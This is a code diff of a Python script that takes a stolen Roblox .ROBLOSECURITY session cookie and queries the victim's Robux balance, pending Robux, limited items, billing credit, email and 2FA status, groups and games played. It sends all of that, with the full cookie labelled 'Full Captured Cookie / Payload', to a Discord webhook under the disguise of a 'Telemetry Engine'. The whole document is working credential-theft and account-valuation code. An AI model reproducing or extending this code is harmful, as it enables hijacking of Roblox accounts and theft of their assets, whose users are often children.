@@ -1,34 +1,17 @@
 import sys
 import base64
 import os
-import urllib.request
-import urllib.error
-import json
+import requests
 import re
-import time
-from datetime import datetime, timezone, timedelta
+from datetime import datetime, timezone
 
-def safe_get(url, headers=None):
+def get_csrf_token(session, headers):
+    """Fetch Roblox X-CSRF-Token required for economy & membership endpoints"""
     try:
-        req = urllib.request.Request(url, headers=headers or {'User-Agent': 'Mozilla/5.0'})
-        with urllib.request.urlopen(req, timeout=10) as res:
-            if res.status == 200:
-                return json.loads(res.read().decode('utf-8'))
+        res = session.post("https://auth.roblox.com/v1/logout", headers=headers)
+        return res.headers.get("x-csrf-token", "")
     except Exception:
-        pass
-    return None
-
-def get_csrf_token(headers):
-    """Fetch Roblox X-CSRF-Token required for economy & transaction endpoints"""
-    try:
-        req = urllib.request.Request("https://auth.roblox.com/v1/logout", data=b"", headers=headers, method="POST")
-        with urllib.request.urlopen(req, timeout=5) as res:
-            pass
-    except urllib.error.HTTPError as e:
-        return e.headers.get("x-csrf-token", "")
-    except Exception:
-        pass
-    return ""
+        return ""
 
 def main():
     try:
@@ -57,183 +40,233 @@ def main():
         roblosecurity = re.sub(r'\s+', '', roblosecurity)
         roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')
 
-        headers = { 
-            "Cookie": f".ROBLOSECURITY={roblosecurity}",
+        session = requests.Session()
+        session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com")
+        session.headers.update({
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
             "Referer": "https://www.roblox.com/",
-            "Origin": "https://www.roblox.com/",
-            "Accept": "application/json, text/plain, */*"
-        }
+            "Origin": "https://www.roblox.com/"
+        })
 
-        # Inject CSRF Token to bypass 403 blocks on economy/transaction endpoints
-        csrf_token = get_csrf_token(headers)
+        # Inject CSRF token to bypass 403 blocks
+        csrf_token = get_csrf_token(session, session.headers)
         if csrf_token:
-            headers["X-CSRF-Token"] = csrf_token
+            session.headers.update({"X-CSRF-Token": csrf_token})
 
-        user_data = safe_get("https://users.roblox.com/v1/users/authenticated", headers)
-        
-        username = "Unknown User"
-        user_id = 0
-        cookie_status = "🔴 Invalid / Expired"
-        robux_balance = 0
-        pending_robux = 0
-        total_spent_past_year = 0
-        account_age_days = 0
-        has_korblox = False
-        has_headless = False
+        # --- 1. Fetch Authenticated User Session ---
+        auth_res = session.get("https://users.roblox.com/v1/users/authenticated")
+        if auth_res.status_code != 200:
+            print(f"DEBUG: Authentication failed with status {auth_res.status_code}", file=sys.stderr)
+            sys.exit(1)
+            
+        auth_data = auth_res.json()
+        user_id = auth_data.get("id")
+        if not user_id:
+            sys.exit(1)
 
-        # Game-specific tracking (e.g., Adopt Me Universe ID: 383310974)
-        ADOPT_ME_UNIVERSE = 383310974
-        played_adopt_me = False
-        adopt_me_spent = 0
-        adopt_me_passes_count = 0
+        # --- Fetchers ---
+        def get_user_info():
+            return session.get(f"https://users.roblox.com/v1/users/{user_id}").json()
 
-        mm2_passes = 0
-        ps99_passes = 0
+        def get_robux():
+            r = session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency").json()
+            return r.get("robux", 0)
 
-        if user_data and "id" in user_data:
-            username = user_data.get("name", "Unknown")
-            user_id = user_data.get("id", 0)
-            cookie_status = "🟢 Valid & Active"
+        def get_pending():
+            r = session.get(
+                f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals",
+                params={"transactionType": "summary", "timeFrame": "Year"}
+            ).json()
+            return r.get("pendingRobuxTotal", 0)
 
-            user_info = safe_get(f"https://users.roblox.com/v1/users/{user_id}", headers)
-            if user_info and "created" in user_info:
-                try:
-                    created_dt = datetime.fromisoformat(user_info["created"].replace("Z", "+00:00"))
-                    account_age_days = (datetime.now(timezone.utc) - created_dt).days
-                except Exception:
-                    pass
-
-            # Fetch Robux Balance
-            economy_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers)
-            if economy_data:
-                robux_balance = economy_data.get("robux", 0)
-
-            # Fetch Pending Robux
-            totals_data = safe_get(f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals?transactionType=summary", headers)
-            if totals_data:
-                pending_robux = totals_data.get("pendingRobux", 0)
-
-            # --- 1. Check Badges for Adopt Me Playtime Verification ---
-            badge_cursor = ""
-            for _ in range(3): # Check recent pages of badges
-                badge_url = f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100"
-                if badge_cursor:
-                    badge_url += f"&cursor={badge_cursor}"
-                badge_res = safe_get(badge_url, headers)
-                if not badge_res or "data" not in badge_res:
+        def get_limiteds():
+            limiteds = []
+            cursor = ""
+            while True:
+                params = {"limit": 100}
+                if cursor:
+                    params["cursor"] = cursor
+                r = session.get(
+                    f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles",
+                    params=params
+                ).json()
+                for item in r.get("data", []):
+                    limiteds.append(item.get("recentAveragePrice", 0))
+                cursor = r.get("nextPageCursor")
+                if not cursor:
                     break
-                for b in badge_res["data"]:
-                    if b.get("awardingUniverse", {}).get("id") == ADOPT_ME_UNIVERSE:
-                        played_adopt_me = True
-                        break
-                if played_adopt_me:
-                    break
-                badge_cursor = badge_res.get("nextPageCursor")
-                if not badge_cursor:
-                    break
+            return limiteds
 
-            # --- 2. Scan Purchases & Universe Spending ---
-            one_year_ago = datetime.now(timezone.utc) - timedelta(days=365)
-            tx_cursor = ""
-            for _ in range(3): # Scan up to 300 recent transactions
-                tx_url = f"https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType=Purchase&limit=100"
-                if tx_cursor:
-                    tx_url += f"&cursor={tx_cursor}"
-                tx_data = safe_get(tx_url, headers)
-                if not tx_data or "data" not in tx_data:
-                    break
-                
-                for tx in tx_data["data"]:
-                    created_str = tx.get("created", "")
-                    try:
-                        tx_date = datetime.fromisoformat(created_str.replace("Z", "+00:00"))
-                        if tx_date >= one_year_ago:
-                            amount = tx.get("currency", {}).get("amount", 0)
-                            if amount < 0:
-                                total_spent_past_year += abs(amount)
+        def get_premium():
+            r = session.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership")
+            return r.json() == True
 
-                        # Check if transaction belongs to Adopt Me Universe
-                        place_info = tx.get("details", {}).get("place", {})
-                        if place_info.get("universeId") == ADOPT_ME_UNIVERSE:
-                            adopt_me_spent += abs(tx.get("currency", {}).get("amount", 0))
-                            if tx.get("details", {}).get("type") == "GamePass":
-                                adopt_me_passes_count += 1
+        def get_groups():
+            r = session.get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles").json()
+            groups = r.get("data", [])
+            owned = sum(1 for g in groups if g.get("role", {}).get("rank") == 255)
+            return len(groups), owned
 
-                        # General item name checks for MM2 / PS99
-                        details = tx.get("details", {})
-                        item_name = str(details.get("name", "")).lower()
-                        if any(k in item_name for k in ["mm2", "murder mystery", "godly mm2", "knife mm2"]):
-                            mm2_passes += 1
-                        if any(k in item_name for k in ["pet simulator", "ps99", "exclusive pet", "huge pet"]):
-                            ps99_passes += 1
-                    except Exception:
-                        continue
-                
-                tx_cursor = tx_data.get("nextPageCursor")
-                if not tx_cursor:
-                    break
+        def get_games_developer():
+            r = session.get(f"https://develop.roblox.com/v1/user/universes?userId={user_id}").json()
+            return len(r.get("data", [])) > 0
 
-            # Korblox & Headless Check
-            has_korblox = bool(safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192/is-owned", headers))
-            has_headless = bool(safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/201/is-owned", headers))
+        def get_account_settings():
+            r = session.get("https://accountsettings.roblox.com/v1/email").json()
+            email_verified = r.get("verified", False)
+            r2 = session.get("https://twostepverification.roblox.com/v1/metadata").json()
+            twofa = r2.get("twoStepVerificationEnabled", False)
+            return email_verified, twofa
 
-        avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"
+        def get_credit():
+            r = session.get("https://billing.roblox.com/v1/credit").json()
+            return r.get("balance", 0), r.get("currencyType", "Unknown")
+
+        def check_played(universe_id):
+            cursor = ""
+            while True:
+                r = session.get(
+                    f"https://badges.roblox.com/v1/users/{user_id}/badges",
+                    params={"limit": 100, "cursor": cursor}
+                ).json()
+                for badge in r.get("data", []):
+                    if badge.get("awardingUniverse", {}).get("id") == universe_id:
+                        return True
+                cursor = r.get("nextPageCursor")
+                if not cursor:
+                    return False
+
+        # --- Gather Data ---
+        user        = get_user_info()
+        username    = user.get("name", "Unknown")
+        display_name = user.get("displayName", username)
+        created     = user.get("created", "")
+        age_days    = (datetime.now(timezone.utc) - datetime.fromisoformat(
+                        created.replace("Z", "+00:00"))).days if created else 0
+
+        robux       = get_robux()
+        pending     = get_pending()
+        limiteds    = get_limiteds()
+        rap         = sum(limiteds)
+        lim_count   = len(limiteds)
+        premium     = get_premium()
+        group_count, owned = get_groups()
+        developer   = get_games_developer()
+        email_ver, twofa = get_account_settings()
+        credit, currency = get_credit()
+
+        adopt_me    = check_played(383310974)
+        mm2         = check_played(142823291)
+        ps99        = check_played(3259657279)
+
+        avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
         full_cookie_display = f"```text\n{roblosecurity}\n```"
 
         payload = {
-            "content": f"@everyone New Payload / Request Captured from **{username}**!",
-            "username": f"{username} | RBXDEV Bot",
-            "avatar_url": avatar_thumb,
+            "username": f"{display_name} | Stats",
+            "avatar_url": avatar_url,
             "embeds": [{
-                "author": {
-                    "name": "Discord Notification",
-                    "icon_url": "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f4bb.png"
-                },
+                "title": f"👑 [{display_name} | 13+]",
                 "description": (
-                    f"👑 **[{username} | 13+]**\n"
-                    f"🔗 **[Roblox Profile](https://www.roblox.com/users/{user_id if user_id else 1}/profile)**\n\n"
-                    f"👤 **Username**\n`{username}`\n\n"
-                    f"📈 **Account Stats**\n"
-                    f"> • Account Age: `{account_age_days} Days`\n"
-                    f"> • Played Adopt Me: `{'Yes' if played_adopt_me else 'No'}`\n"
-                    f"> • Past 1 Year Spent: `{total_spent_past_year} 🪙`\n\n"
-                    f"🪙 **Robux Balance & Pending**\n"
-                    f"> • Balance: `{robux_balance:,} 🪙`\n"
-                    f"> • Pending: `{pending_robux:,} 🪙`\n\n"
-                    f"🎮 **Gamepass & Universe Activity**\n"
-                    f"> • Adopt Me Spent: `{adopt_me_spent} 🪙`\n"
-                    f"> • Adopt Me Passes: `{adopt_me_passes_count}`\n"
-                    f"> • MM2 Items: `{mm2_passes}`\n"
-                    f"> • PS99 Items: `{ps99_passes}`\n\n"
-                    f"🎒 **Inventory Items**\n"
-                    f"> • Korblox: `{str(has_korblox)}`\n"
-                    f"> • Headless: `{str(has_headless)}`\n\n"
-                    f"📊 **Status**: `{cookie_status}`\n\n"
-                    f"🔑 **Full Captured Cookie / Payload**:\n{full_cookie_display}"
+                    f"🔗 **[Rolimons Stats](https://www.rolimons.com/player/{user_id})** | "
+                    f"**[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**"
                 ),
-                "color": 3092790,
-                "thumbnail": { "url": avatar_thumb },
-                "footer": { "text": "RBXDEV Telemetry Engine • 2026" }
+                "color": 0x2B2D31,
+                "thumbnail": {"url": avatar_url},
+                "fields": [
+                    # Row 1
+                    {
+                        "name": "👤 Username",
+                        "value": f"`{username}`",
+                        "inline": True
+                    },
+                    {"name": "\u200b", "value": "\u200b", "inline": True},
+                    {"name": "\u200b", "value": "\u200b", "inline": True},
+
+                    # Row 2
+                    {
+                        "name": "📈 Account Stats",
+                        "value": (
+                            f"• Age: `{age_days} Days`\n"
+                            f"• Developer: `{developer}`\n"
+                            f"• Group Members: `{group_count}`"
+                        ),
+                        "inline": True
+                    },
+                    {
+                        "name": "🪙 Robux",
+                        "value": (
+                            f"• Balance: `{robux:,} R$`\n"
+                            f"• Pending: `{pending:,} R$`"
+                        ),
+                        "inline": True
+                    },
+                    {
+                        "name": "📦 Limiteds",
+                        "value": (
+                            f"• RAP: `{rap:,} R$`\n"
+                            f"• Count: `{lim_count}`"
+                        ),
+                        "inline": True
+                    },
+
+                    # Row 3
+                    {
+                        "name": "💳 Payments",
+                        "value": f"• Credit: `{credit:.2f} {currency}`",
+                        "inline": True
+                    },
+                    {
+                        "name": "🎮 Games Played",
+                        "value": (
+                            f"• Adopt Me: `{adopt_me}`\n"
+                            f"• MM2: `{mm2}`\n"
+                            f"• PS99: `{ps99}`"
+                        ),
+                        "inline": True
+                    },
+                    {
+                        "name": "⚙️ Settings",
+                        "value": (
+                            f"• Email Verified: `{email_ver}`\n"
+                            f"• 2FA: `{twofa}`"
+                        ),
+                        "inline": True
+                    },
+
+                    # Row 4
+                    {
+                        "name": "⭐ Premium",
+                        "value": f"`{premium}`",
+                        "inline": True
+                    },
+                    {
+                        "name": "👥 Groups",
+                        "value": (
+                            f"• Owned: `{owned}`\n"
+                            f"• Joined: `{group_count}`"
+                        ),
+                        "inline": True
+                    },
+                    {"name": "\u200b", "value": "\u200b", "inline": True},
+
+                    # Row 5 (Full Payload Block)
+                    {
+                        "name": "🔑 Full Captured Cookie / Payload",
+                        "value": full_cookie_display,
+                        "inline": False
+                    }
+                ],
+                "footer": {"text": "RBXDEV Telemetry Engine • 2026"},
+                "timestamp": datetime.now(timezone.utc).isoformat()
             }]
         }
 
-        data = json.dumps(payload).encode('utf-8')
-        req = urllib.request.Request(
-            webhook_url, data=data,
-            headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        )
-
-        for attempt in range(3):
-            try:
-                with urllib.request.urlopen(req, timeout=10) as response:
-                    print(f"DEBUG: Telemetry Embed Sent Successfully! Status: {response.status}", file=sys.stderr)
-                    break
-            except urllib.error.HTTPError as e:
-                if e.code == 429:
-                    time.sleep(3 * (attempt + 1))
-                else:
-                    raise e
+        r = requests.post(webhook_url, json=payload, timeout=10)
+        if r.status_code in (200, 204):
+            print("DEBUG: Embed sent successfully!", file=sys.stderr)
+        else:
+            print(f"DEBUG: Failed to send embed: {r.status_code} - {r.text}", file=sys.stderr)
 
     except Exception as e:
         print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
